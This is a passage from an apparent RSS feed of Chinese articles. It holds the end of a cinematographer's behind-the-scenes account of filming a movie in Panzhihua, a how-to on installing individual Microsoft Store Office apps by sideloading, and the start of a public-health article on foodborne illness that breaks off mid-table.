有很强的隐喻性，通往未知的家园。</p>\n<p>影片共出现三次隧道，第一次是水青在曲婷车上通过一个隧道，她们说到米易县（攀枝花下属的一个县）的一个隧道连接老城和新城，曲婷在车上说到你外婆是米易人，这就直接承认了三代血脉关系，真正的母女十六年后终于在一起了。水青说运气好的话，出了米易的隧道就可以回到自己最想回到的时刻…好神秘的语气和相逢。这场开始是从水青把手伸到窗外摇到母女二人的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-883f4a27ab05887b1eb78fb3317cf99b_720w.jpg?rss\" data-rawwidth=\"2708\" data-rawheight=\"1538\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-883f4a27ab05887b1eb78fb3317cf99b\" data-watermark-src=\"v2-25ca751c9921d38f4f5b9186e1fd4525\" data-private-watermark-src=\"v2-6ec518a78efbe6902add3e3011a3c668\"></p>\n<p>第二次是四个人聚餐后，车上喝着酒唱着乐园歌曲奔向一个黑漆漆的隧道表白，只是全片最欢乐开心的时刻，可谓末路狂花穿隧道，母女情深快乐园。导演就是想把四个女人的关系处理为逛乐园的感觉。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-46b147f9d1d4c113b52d722ef53f9e5f_720w.jpg?rss\" data-rawwidth=\"2855\" data-rawheight=\"1425\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-46b147f9d1d4c113b52d722ef53f9e5f\" data-watermark-src=\"v2-4ae3749adc6af4ba0e7a939c6e53b1b4\" data-private-watermark-src=\"v2-e3469711e5696af4ade1c952c1af2693\"></p>\n<p>第三次出现隧道是结尾，冒着烟雾神秘的隧道，黄车开出来行驶在隧道中，水青面对镜头微笑，其实水青是在幻想和马悦悦说话。这是对第一次隧道车上水青和妈妈说米易隧道的的回应，水青手上拿着印着马悦悦头像的房地产广告册页。出了这个隧道就回到新城一个温暖的家。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-373bff795e6bded35c7f4ad0c0d43661_720w.jpg?rss\" data-rawwidth=\"3272\" data-rawheight=\"1415\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-373bff795e6bded35c7f4ad0c0d43661\" data-watermark-src=\"v2-2843bf77dc57c2e942ef6ddbba1134d8\" data-private-watermark-src=\"v2-2a8c9328630086e4d324d7f279286cf4\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4bef1cd2c7ee28d101f5874302722128_720w.jpg?rss\" data-rawwidth=\"3308\" data-rawheight=\"1780\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4bef1cd2c7ee28d101f5874302722128\" data-watermark-src=\"v2-3728531066848038bca1831f94a98982\" data-private-watermark-src=\"v2-d2150d3d574ae7662a2af7652d131edc\"></p>\n<p>我自己是很痴迷这种独特的空间，觉得有一种生命的不可预知性在里面。2008年我在韩国学习时，拍摄短片就有一场隧道的戏，当时从黄岳泰老师那里学到很多，他给我详细讲解了他摄影，金城武主演《不夜城》的幕后。我后来还在云南、北京、浙江、陕西拍摄过不同结构的隧道。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-890514e64d68b38ceca65969382a9236_720w.jpg?rss\" data-rawwidth=\"2592\" data-rawheight=\"1787\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-890514e64d68b38ceca65969382a9236\" data-watermark-src=\"v2-3a82c95a49fd6c9be669df6dd5be1a93\" data-private-watermark-src=\"v2-3fa9675a4165fa0838bbb4e78609c5bb\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-8e79bbcd0968f2369406766fab75ccf7_720w.jpg?rss\" data-rawwidth=\"3264\" data-rawheight=\"2448\" data-size=\"normal\" data-caption=\"（2008年在釜山拍摄，背景是隧道和车戏专用低角度拖车）。\" data-watermark=\"watermark\" data-original-src=\"v2-8e79bbcd0968f2369406766fab75ccf7\" data-watermark-src=\"v2-cebde7e41eb5f0be21ea2acbb7d98779\" data-private-watermark-src=\"v2-358994736ec3b32c0e7e7e3d8bcd3dc5\"></p>\n<p><br></p>\n<p>七问：拍摄中有没有意外呈现或者说惊喜画面给大家分享？</p>\n<p>答： </p>\n<p><img src=\"https://pic4.zhimg.com/v2-31992ccc1b267a057e208228d99e1e53_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"806\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-31992ccc1b267a057e208228d99e1e53\" data-watermark-src=\"v2-da3926b37286b447a90c7bd70ea71f80\" data-private-watermark-src=\"v2-cf4b0579eccd4f7298096f2027fa7355\"></p>\n<p>全片女人味最足的地方就是聚餐后去隧道，四个女人唱歌，万茜开车的戏。我们先是黄昏密度时刻在炳草岗大桥拍完第一个镜头，堵车中转场金沙江大道东段大本营已经晚上10点了，刚在拖车上拍了一条，此刻雨越下越大，江边路灯熄灭了，演员快超时了，三大问题迎面而来，几乎面临崩溃，大家累了一天此刻出现浮躁情绪，伙伴们疑惑地看着我，顿时压力山大。我和导演说，稍等我备双机拍摄力图加快进度，那是一个冒险的决定。我们摄影组5个人是单机职位配置，一个小助理临时充当我的焦点员，我装了一个28-76mm变焦镜头在拖车的右侧，重新安排了s60照明，行驶中抓拍到了李庚希唱歌，突然她打开车窗，把脖子伸出来呼吸挥手，还敲万茜车窗玻璃互动，好美的时刻，这一段是演员即兴表演被我装的是变焦镜头抓拍到了一条过，李庚希探头到前车窗时我zoom out了才能框住母女二人。没有想到定档海报就是那个瞬间的截图，概括了这短暂开心的瞬间。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-294b08cb34d74f94b7e8cbc8cd6060f4_720w.jpg?rss\" data-rawwidth=\"3316\" data-rawheight=\"1825\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-294b08cb34d74f94b7e8cbc8cd6060f4\" data-watermark-src=\"v2-23ce0895ef63521629f3f2c975a03d56\" data-private-watermark-src=\"v2-69232edaf72ac96c28baba093ca0ba6e\"></p>\n<p>感谢好友邓东和铁头 TILTA赞助我个人的三轴原力跟焦器在这个时刻派上用场，其他很多车戏我用它除了控制焦点，还单独控制zoom变换景别。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-ea87c840951ca16d66fa78b9a97c7974_720w.jpg?rss\" data-rawwidth=\"799\" data-rawheight=\"592\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-ea87c840951ca16d66fa78b9a97c7974\" data-watermark-src=\"v2-5ebb32b509fdfc84fc2cee0cbe5a485f\" data-private-watermark-src=\"v2-28ea6c8b3adc277ff3e50633d591aee2\"></p>\n<p>原剧本里只有一场雨戏气氛，但现在大家在完成片里看到的很多场景湿漉漉的感觉。我要说我们这个团队是吉人天相，顺势而为，老天帮了很多忙。</p>\n<p>针对剧本仅一场清晨的外景雨戏，我和导演商量了了一个长镜头方案，需要人工降雨，因为透视空间很大，制片主任定制了可以调控雨量的喷头。在开机前一天还专门做了下雨测试。这场戏是凌晨四个人从隧道表白回来后，金熙和马悦悦在大桥上遇到老马，那一刻天空开始下雨了。后面要拍的是曲婷水青母女下车回到剧场的路上，水青在拐角初发现一辆黑色车里有两个男人，这是全片由调性节奏的转折点，一个镜头完成。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-e970884eedd1b2deecd7cb256cbc6da9_720w.jpg?rss\" data-rawwidth=\"4020\" data-rawheight=\"2694\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e970884eedd1b2deecd7cb256cbc6da9\" data-watermark-src=\"v2-0503596e7f0afe7a9524036cb51d2eb7\" data-private-watermark-src=\"v2-15a304724363397ac1da1a27a1df7996\"></p>\n<p> 那几天气预报都是阳光明媚36度高温且晴天，我提议也要清晨太阳没有照到场景开始拍，现在影片里的呈现效果非常好。</p>\n<p> 学校广播站拍完水青独白的时候，天将大雨，我们立即外出拍摄了局部的下雨空景。我用使用不多三脚架对着天空，长时间拍摄10分钟，等拍到了闪电。这个镜头加强了水青想绑架金熙不成，而把诱饵转向马悦悦的紧张气氛。</p>\n<p> 八问：电影前期筹备的影像设想和最后的呈现吻合度是多少？有什么遗憾？</p>\n<p>答：有人形容导演是带着镣铐跳舞，摄影也是一样，在规定的资源里拼智慧拼能力来实现想法，我们选择了一条自由偏即兴的方法，这种创作方法有一定门槛，国内娄烨和李玉两位导演采用的比较多，刚好李玉是这个电影监制，我和导演都是娄烨粉丝，劳雷影业的基因也是偏这种风格的，方励是娄烨《颐和园》的制片人，娄烨另一位长期合作制片人耐安姐还和方励在这部电影里客串马悦悦的干爹干妈，所以现在大家看到的影像是这个团队一种自觉的选择。</p>\n<p>在实拍过程中，还是需要不断调整，技术与艺术的，但大的氛围和框架不会变，大部分契合原来的设想。比较满意的几个片段是水青幻想妈妈跳舞，想象自己小时候父母在床上逗自己玩，她的噩梦，流血 五指似乎要逃离，她幻想回家偷房本的追光，我认为比较好的是光影参与到叙事本身，而不是靠台词，虽然很短，但力量很足，这些的实现都需要团队高度配合。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9190dc5b35e1d1e3d1d0048aff9d0cac_720w.jpg?rss\" data-rawwidth=\"3344\" data-rawheight=\"1797\" data-size=\"normal\" data-caption=\"（水青的幻觉中的妈妈 莫妮卡）\" data-watermark=\"watermark\" data-original-src=\"v2-9190dc5b35e1d1e3d1d0048aff9d0cac\" data-watermark-src=\"v2-bffd5de8fb8a8057389735babfe7c220\" data-private-watermark-src=\"v2-95d97c98fed02d6c85d73843ebee07ec\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0c052a6e6ae4634c1a6f6e2ab2b4dfbc_720w.jpg?rss\" data-rawwidth=\"3173\" data-rawheight=\"1778\" data-size=\"normal\" data-caption=\"（水青在破沙发上的梦  这个五指手印和导演微信头像一样）\" data-watermark=\"watermark\" data-original-src=\"v2-0c052a6e6ae4634c1a6f6e2ab2b4dfbc\" data-watermark-src=\"v2-ce45acc94b6ad19e7728eac18d19520a\" data-private-watermark-src=\"v2-2bfb0d8862250c88538960f43c72e21d\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7e93dce87e34b69df31b69e335b6fa0_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"1131\" data-size=\"normal\" data-caption=\"（几何感构图在测试和完成方面保持一致，水青和老马回家人物被放在画面的边缘位置，显得微乎其微，大反差压抑而不自知，突出无力感）\" data-watermark=\"watermark\" data-original-src=\"v2-d7e93dce87e34b69df31b69e335b6fa0\" data-watermark-src=\"v2-dc0076c51e539a57fc42ba9504677fed\" data-private-watermark-src=\"v2-65e5e3927620eed0f3326124bc23e761\"></p>\n<p>在光影实现层面有两个遗憾：</p>\n<p>一是曲婷来学校体育馆教跳舞段落。导演要求在拍摄曲婷舞蹈的中间高光时刻，画面中心突然亮起来，四周要暗下去，我针对环境和现有灯具做出判断 空旷的体育馆拍摄日景实现不了。导演坚持原来想法，后来勉强把灯放在屋内楼顶，最后的效果是表演特别好，但光影平庸不自然也没有美感，没有帮助表演和实现导演意图。</p>\n<p>二是电影结尾最后在水青的金沙江边乐园，她带妈妈来这电话勒索老马要钱，随后被远处玩激光笔的驴友照射下发生了误判，失手误杀马悦悦，母女互相拯救的几场大戏，现在呈现光线衔接不好，环境太暗，拍摄时采用1000感光度和f1.4光孔，环境噪点很大。我和灯光师商量原计划使用气球灯在做底子光照明，制片反馈气球灯被《中国女排》拍摄调走长期使用。后来我和美术组商量，在远处对面的小路立几个支架做几个类似路灯的效果，这样高光可以反射到江面，稍微改善了一些反光。母女抱头痛哭时，只好把调度放到车灯前。 </p>\n<p><img src=\"https://pic1.zhimg.com/v2-e5a5992171c7beac724f684fb76c26e1_720w.jpg?rss\" data-rawwidth=\"2114\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-e5a5992171c7beac724f684fb76c26e1\" data-watermark-src=\"v2-b430d654f22b925aad8af57e5a0e3968\" data-private-watermark-src=\"v2-b816fd61785dce1c5e8b1e4b18f47e28\"></p>\n<p><br></p>\n<p>九问：请小结这个电影摄影方面的的得失？</p>\n<p>答：我总结了几个贴士tips： </p>\n<p>tips1：摄影机不是一台冷冰的机器，而是一个温暖的演员。</p>\n<p>tips2：同一场景中，改善打光，让表演直抵人心。</p>\n<p>tips3：做了很多灯光参考，有时现场要大胆破除设定，没有固定打光逻辑。</p>\n<p>tips4：拍摄忘掉分镜，最终做到的总没有之前想的好。</p>\n<p>tips5：突破自由和限制的边界，像《吉祥如意》，下一部电影会更好。</p>\n<p><br></p>\n<p>导演和演员是坐轿子的，摄影只是抬轿子的，最多是个颠轿子的。</p>\n<p>做到有风格、有氛围、有力量、有追求，不容易，这一部我说无悔。</p>\n<p>拍电影是玩魔法，需要直觉和化学反应，坚持就不错。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-d7608534e5ee33cc60154454f62fd797_720w.jpg?rss\" data-rawwidth=\"4029\" data-rawheight=\"2666\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d7608534e5ee33cc60154454f62fd797\" data-watermark-src=\"v2-6cc0779244518d4f57141474f8ebfc71\" data-private-watermark-src=\"v2-5c3576806f0117f5876c0aded39674e6\"></p>\n<p>感谢监制、制片人、导演、制片主任张建、制片曲建伟、美术指导张杰涛 执行导演房震、第一副导演小凡、 画林朴总田总，ko rental卢总王平以及我的团队（掌机张兴阳 焦点刘志 摄助亓家桢 王富强 郭总会 大兵 、灯光师孙俊强和移动组长赵春城）。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-409a6e7f3628d54f00833ecf230eefb1_720w.jpg?rss\" data-rawwidth=\"4006\" data-rawheight=\"2811\" data-size=\"normal\" data-caption=\"（摄影组成员和三位小兔子周子越 金烨 李庚希）\" data-watermark=\"watermark\" data-original-src=\"v2-409a6e7f3628d54f00833ecf230eefb1\" data-watermark-src=\"v2-d2e49eb8354a01aff46ed91ea871a911\" data-private-watermark-src=\"v2-f4617f079fc524ec4122daa50af3f467\"></p>\n<p>最后分享一组片场照片，怀念那一段难忘酷暑的攀枝花时光。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3c0dcb3acc9219831f986a4fbd3a6c5e_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3c0dcb3acc9219831f986a4fbd3a6c5e\" data-watermark-src=\"v2-eac5ee22d4143559eba076924cb2e1dd\" data-private-watermark-src=\"v2-30601e17ad9e273d2bb3d79b323e57b5\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7e75c5018e43c93198e905a4f1904c6c_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-7e75c5018e43c93198e905a4f1904c6c\" data-watermark-src=\"v2-dee21c3794b2b074792abb21b53ff869\" data-private-watermark-src=\"v2-6c0519b7c53ac467565ed59f0d54fdb5\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d46afbf27aadeb7d3ae2fe45c0b2b6d_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-1d46afbf27aadeb7d3ae2fe45c0b2b6d\" data-watermark-src=\"v2-e486735f20082fd501a7ba01143a08a7\" data-private-watermark-src=\"v2-ccd7eb151440277c0c04ec6c47cb309a\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d883aa0cee21e780997d3442059cac4a_720w.jpg?rss\" data-rawwidth=\"1213\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d883aa0cee21e780997d3442059cac4a\" data-watermark-src=\"v2-3f227c29156dbdf693910c9043e9d507\" data-private-watermark-src=\"v2-05efcd85ea1a8407717007cf3aa71bd3\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d4f707b1f06089b0ed49cc5969c7bf88_720w.jpg?rss\" data-rawwidth=\"1214\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d4f707b1f06089b0ed49cc5969c7bf88\" data-watermark-src=\"v2-5d578c68a6b4d510670956963532038c\" data-private-watermark-src=\"v2-ac4b8ca01ad28c41e290010fe31328ea\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0f4710b8f0de0cf12b063a90f3c0b985_720w.jpg?rss\" data-rawwidth=\"1214\" data-rawheight=\"813\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0f4710b8f0de0cf12b063a90f3c0b985\" data-watermark-src=\"v2-7648809243d193ad8bee0ffa4e4af2e8\" data-private-watermark-src=\"v2-4d05f2699b540dc6be9171085bda2daa\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0993295fa37dc064015c610fa3bedd11_720w.jpg?rss\" data-rawwidth=\"1089\" data-rawheight=\"1044\" data-size=\"small\" data-caption=\"（以上六图使用过期富士胶卷，leica3G相机 50mm2.8缩头拍 2019年6月摄于四川攀枝花） \" data-watermark=\"watermark\" data-original-src=\"v2-0993295fa37dc064015c610fa3bedd11\" data-watermark-src=\"v2-ad77bdf8dde498506b43ceb5f8bd5910\" data-private-watermark-src=\"v2-c28a83311dff834d2e9aad4c90209cac\"></p>\n<p>     2021年8月14日七夕 影片上映首日北京 汪士卿</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wangfilms?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Wangfilms</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/475771670/answer/2068227062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/408205831?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有没有血腥但剧情好看的电影?</a><br><a href=\"http://www.zhihu.com/question/374146603?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">有什么剧情比较曲折，比较费脑的电影？</a><br>\n","link":"http://www.zhihu.com/question/475771670/answer/2068227062?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"一日一技 | 「全家桶」变「自助餐」，三步搞定商店版 Office 应用按需安装","date":"2021-08-18 09:30:00","description":"\n<p>如果你用过 Microsoft 365 中的 Office，应该对它的常规安装体验并不陌生：在网页中点击安装链接、跳转并下载一个网络安装程序，然后双击打开、自动下载所有的组件并等待安装完成……整个过程可以在几乎无需人为干预的情况下安装好大量 Office 应用，可以说是「一键安装」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/6b0f7c9e7124b59b81bd62b4b83514a1.png\"><figcaption>Microsoft 365 安装和卸载体验默认都是「打包」的</figcaption></figure><p>不过这种简单、好用的安装模式对于存储空间有限的办公设备而言不算友好，因为当中默认包含了非常多的 Office 组件，除了大家常用的 Word、Excel 和 PowerPoint，还有 Access、OneNote、Outlook、Publisher，对我个人而言，这些组件要么平时不怎么使用，要么现有工作流中已有更专业的替代产品。</p>\n<p>无奈想要单独卸载其中某项也是不太现实的，所以我们还是只能从安装入手：针对企业、团队用户，微软其实为 Office 套件定制化部署推出过 <a href=\"https://docs.microsoft.com/zh-cn/deployoffice/overview-office-deployment-tool\" target=\"_blank\">Office 部署工具</a>，有 IT 经验的朋友可以通过编辑配置文件的方式来对想要安装的组件进行定制。不过这种方法对普通用户而言不太友好，操作流程也略为劝退：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/18/58f99c41a8af8e0f30b0c5270d72034d.png\"><figcaption>Office 部署工具操作截图</figcaption></figure><p>所以我们在本文中介绍另一种思路。</p>\n<p>微软早前推出 Windows 10 S（Windows 10 in S mode）时，曾在其 Microsoft Store 中同步发布了 UWP 版本的 Office，这个 UWP 版本的 Office 在功能上和桌面安装版本的 Office 几乎没有区别，可以看作是 Office 套件的 win32 转制版本。更重要的是，和桌面安装时默认安装所有组件不同， Microsoft Store 版本的 Office 可以单独管理、下载各个 Office 组件——遗憾的是从 2019年开始，直接在 Microsoft Store 搜索下载 Office 组件后点击安装会重新定向到 Microsoft 365 网站中进行操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/18/cb6520a5088723115603dc93bbdc43e9.png\"><figcaption>Microsoft Store 中提供独立版本，但点击安装还是会跳转至打包版下载页面</figcaption></figure><p>所以现在想要安装 Microsoft Store 上的 UWP 版 Office 组件就只能另辟蹊径了。</p>\n<p><strong>首先，我们通过第三方网站解析 Microsoft Store 应用的下载地址</strong>。</p>\n<p>既然直接在商店搜索下载不成功，那不妨通过旁加载 UWP 安装包来实现。这里我们需要打开一个第三方的 Microsoft Store 应用下载解析网站，通过它来获取 Microsoft Store 中应用的真实下载地址。</p>\n<p>以这个 <a href=\"https://store.rg-adguard.net/\" target=\"_blank\">网站</a> 为例：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/95897907ff858c2b42316618b6822217.png\"><figcaption>网站主页</figcaption></figure><p>在中间的地址栏中将下面的地址贴进去：</p>\n<p><code>https://www.microsoft.com/en-us/p/word/cfq7ttc0k7c7</code></p>\n<p>其他选项不变，然后点击最右边的 <code>√ </code> 解析地址，之后就可以看到 Office 365 所有对应的 UWP 版本套件安装包列表。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/7f50e511ebd309fc01a45989ee38a07f.png\"><figcaption>解析列表</figcaption></figure><p>滚动列表页到最下面，我们首先需要下载的是 Office 基础包，名称是 <code>Microsoft.Office.Desktop_160xx</code>，其后缀有两种，一种是 <code> .BlockMap</code>，另一种是 <code>.appxbundle</code>，这里下载的应该都是 <code>.appxbundle</code> 后缀的安装包。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/e85eaef1afce69c5d5c1ee4c8f1891bb.png\"><figcaption>找到对应的安装包</figcaption></figure><p>另外列出的包有版本号区别，目前列出了安装底包中就包括三种，分别为 16001、16051 以及 16031，<strong>下面下载的组件都需要与之保持一致</strong>。比如这里我选择的是 16031 这个版本，因此我首先下载的是这个安装包：</p>\n<ul><li>Microsoft.Office.Desktop_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li></ul>\n<p>整个包的大小在 3.92G 左右。需要注意是直接点击链接无法正常解析到下载页面，这里推荐使用下载工具来进行保存。虽然我购买了 Office 365 家庭版，但实际上我只需要四个组件：Word、Excel、PowerPoint 以及 Outlook，因此通过使用下载工具来下载对应的包：</p>\n<ul>\n<li>Microsoft.Office.Desktop.Excel_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li>\n<li>Microsoft.Office.Desktop.Outlook_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li>\n<li>Microsoft.Office.Desktop.PowerPoint_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li>\n<li>Microsoft.Office.Desktop.Word_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li>\n</ul>\n<p><strong>下载完成后，接下来就是允许 Windows 系统旁加载 UWP 安装包了</strong>。</p>\n<p>为了以防万一，我们需要调整下 Windows 的部分设置。以 Windows 10 为例，打开「设置 &gt; 更新和安全」，然后找到「开发者选项」将「开发人员模式」的开关打开。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/050bbbde646a5ded7f97ef3e1a58cd8f.png\"><figcaption>设置开发者选项</figcaption></figure><p>设置完成后就可以安装上面下载的 Microsoft Store 版 Office 组件了。首先需要安装体积最大的基础底包，即：</p>\n<ul><li>Microsoft.Office.Desktop_16031.14228.20250.0_neutral_~_8wekyb3d8bbwe.appxbundle</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/1f99663cec96fefb8e6d1c8c448849dc.png\"><figcaption>安装提示</figcaption></figure><p>随后依次安装其他 Office 组件，安装完成后就可以打开任意一个 Office 应用并输入你的微软账号和密码来进行激活了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/d39bc6c3136c3669f6a7fb2fae5d8d77.png\"><figcaption>大功告成</figcaption></figure><p>实际使用起来和原先通过 Click-to-Run 网络安装程序安装的桌面版并无太大差别，在 Microsoft Store 中也可以看到所安装的的确是 UWP 版 Office 组件 —— 虽然名称叫做 Word 2016，但实际版本就是最新的 Office 365。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/17/a05e8419681a642b62461c74733a702f.png\"></figure><p>这种安装方式最大的优势在于可以单独管理 Office 组件，卸载起来也和其他 UWP 应用没什么区别，另外还通过 Microsoft Store 来管理和下载更新！</p>\n<p>如果你有类似的需求，不妨试试这个小技巧。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验📰</p>\n<p>&gt; 特惠订阅 + 深度教程，<a href=\"https://sspai.com/item/25\" target=\"_blank\">Microsoft 365 工具升值包</a> 带你进阶学习 Office 使用技巧</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68345"},{"title":"如何把导致腹泻、肠胃炎的食源性疾病扼杀在「摇篮」里？","date":"2021-08-18 08:00:26","description":"\n<p>食源性疾病是最常见的疾病之一，其与急性呼吸道感染一同成为了假条上的常客。食源性疾病常伴有痛苦的生病过程，除外腹痛、腹泻、恶心、呕吐等症状会折磨我们数天以外，更别说伴随这些症状造成的「马桶灾难」、「菊花末日」等附加伤害了。充分了解食源性疾病的原因，是保护我们脆弱的肠道系统前提，也是让吃货们开心吃喝的必要保障。</p>\n<h2><strong>什么是食源性疾病</strong></h2>\n<p>病从口入从来都是铁打不动的真理，急性感染性胃肠炎是最主要的病因，远远超过其它因素所导致的食源性疾病。</p>\n<p>食物不恰当的处理方式，使得患食源性疾病的风险提高了 1-3 倍。在一项针对于我国一线城市急性感染性腹泻人群的研究中表明：急性感染性腹泻的主要致病细菌依次为副溶血性弧菌、沙门氏菌、肠致病性大肠杆菌和产肠毒素大肠杆菌；主要致病病毒依次为诺如病毒、轮状病毒、萨波病毒、巨乳病毒和肠道腺病毒等；其他病原微生物所造成的感染则十分少见。这些致病菌所造成的临床表现不尽相同，有的症状可在数小时出现，有的症状可能延后数天，甚至有些可发展为慢性疾病，长期折磨我们的消化系统。</p>\n<p>如果我们吃进去的东西包含有大量的致病菌，超过了免疫系统的防御能力时，就会发生典型的急性感染性胃肠炎的症状，根据可导致急性胃肠道症状的致病细菌，我们可以简单作出以下归纳：</p>\n<figure class=\"table\"><table><tbody>\n<tr>\n<td>相关生物或毒素</td>\n<td>出现症状的大致时间</td>\n<td>主要症状</td>\n</tr>\n<tr>\n<td>金黄色葡萄球菌及其肠毒素</td>\n<td>1–7 小时 （平均 2–4 小时）</td>\n<td>恶心、呕吐、干呕、腹泻、腹痛、虚脱。</td>\n</tr>\n<tr>\n<td>蜡样芽孢杆菌（催吐毒素）</td>\n<td>8-16 小时（如果以呕吐为主，则为 2-4 小时）</td>\n<td>呕吐或腹泻（取决于是否存在腹泻或呕吐毒素）；腹部绞痛；恶心。</td>\n</tr>\n<tr>\n<td>诺如病毒</td>\n<td>12–48 小时</td>\n<td>恶心、呕吐、水样非血性腹泻、脱水。</td>\n</tr>\n<tr>\n<td>产气荚膜梭菌</td>\n<td>2–36 小时 （平均 6–12 小时）</td>\n<td>腹部绞痛、腹泻、腐败性腹泻（产气荚膜杆菌），有时会出现恶心和呕吐。</td>\n</tr>\n<tr>\n<td>沙门氏菌属、志贺氏菌属、大肠杆菌</td>\n<td>6–96 小时 （通常为 1–3 天）</td>\n<td>发热、腹部绞痛、腹泻、呕吐、头痛。</td>\n</tr>\n<tr>\n<td>霍乱弧菌（O1 和非 O1）、副溶血性弧菌</td>\n<td>6小时至5天</td>\n<td>腹部绞痛、腹泻、呕吐、发热、不适、恶心、头痛、脱水。</td>\n</tr>\n<tr>\n<td>肠出血性大肠杆菌，弯曲杆菌属</td>\n<td>1–10 天 （通常为 3–4 天）</td>\n<td>腹泻（通常带血）、腹痛、恶心、呕吐、不适、发热（大肠杆菌 O157:H7 不常见）。</td>\n</tr>\n<tr>\n<td>轮状病毒、星状病毒、肠道腺病毒</td>\n<td>3-5 天</td>\n<td>发热、呕吐、水样非炎症性腹泻。</td>\n</tr>\n<tr>\n<td>小肠、结肠炎耶尔森菌</td>\n<td>3-7 天</td>\n<td>发热、腹泻、腹痛。</td>\n</tr>\n<tr>\n<td>溶组织内阿米巴</td>\n<td>1 到数周</td>\n<td>腹痛、腹泻、便秘、头痛、嗜睡、溃疡，可能有多种非典型症状或无症状。</td>\n</tr>\n<tr>\n<td>牛带绦虫，猪带绦虫</td>\n<td>3-6 